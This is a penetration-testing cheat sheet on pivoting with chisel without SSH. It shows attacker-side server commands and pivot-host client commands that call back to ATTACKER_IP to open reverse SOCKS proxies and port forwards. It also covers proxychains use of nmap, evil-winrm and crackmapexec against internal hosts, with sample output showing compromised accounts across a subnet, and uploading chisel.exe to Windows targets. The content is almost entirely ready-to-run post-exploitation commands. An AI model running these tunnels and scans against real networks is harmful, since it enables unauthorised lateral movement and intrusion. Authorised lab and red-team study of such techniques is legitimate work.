# CHISEL (NO SSH NEEDED)

### Start chisel server (attacker)

```bash
chisel server --reverse --port 8000
```

> Run on your machine

**Why:** Listens for client connections

<details>
<summary>Example Output</summary>

```
chisel server --reverse --port 8000
2026/02/24 server: Listening on http://0.0.0.0:8000
2026/02/24 server: session#1: Client connected
(Waiting for agent connections)
```
</details>

---

### Chisel client - reverse SOCKS

```bash
chisel client ATTACKER_IP:8000 R:socks
```

> Run on pivot host

**Why:** Creates SOCKS5 proxy on attacker:1080

<details>
<summary>Example Output</summary>

```
Attacker: chisel server --reverse --port 8000
Pivot:    chisel client 10.10.14.2:8000 R:socks

[server] session#1: tun created
[server] session#1: proxy 127.0.0.1:1080

proxychains nmap -sT -Pn 172.16.1.10
(SOCKS proxy without SSH)
```
</details>

---

### Chisel client - port forward

```bash
chisel client ATTACKER_IP:8000 R:8080:INTERNAL_TARGET:80
```

> Forward specific port

**Why:** Access internal:80 on your localhost:8080

<details>
<summary>Example Output</summary>

```
Attacker: chisel server --reverse --port 8000
Pivot:    chisel client 10.10.14.2:8000 R:8080:172.16.1.10:80

[server] session#1: tun created
[server] Reverse port forwarding 0.0.0.0:8080 => 172.16.1.10:80

curl http://127.0.0.1:8080
(Specific port forward instead of full SOCKS proxy)
```
</details>

---

### Use with proxychains

```bash
proxychains nmap -sT -Pn INTERNAL_IP
proxychains evil-winrm -i INTERNAL_IP -u user -p pass
```

> Route tools through tunnel

**Why:** Same as SSH SOCKS proxy

<details>
<summary>Example Output</summary>

```
proxychains crackmapexec smb 172.16.1.0/24 -u john -p Password1
172.16.1.10  [+] corp\john (Pwn3d!)
172.16.1.20  [-] corp\john
172.16.1.30  [+] corp\john (Pwn3d!)
(Enumerated entire internal subnet through chisel)
```
</details>

---

### Chisel Windows client

```bash
chisel.exe client ATTACKER_IP:8000 R:socks
```

> Works on Windows too

**Why:** Upload chisel.exe to target

<details>
<summary>Example Output</summary>

```
chisel.exe client 10.10.14.2:8000 R:socks
2026/02/24 client: Connected

(Same as Linux client, works on Windows targets)
proxychains from attacker now reaches internal net
```
</details>

---
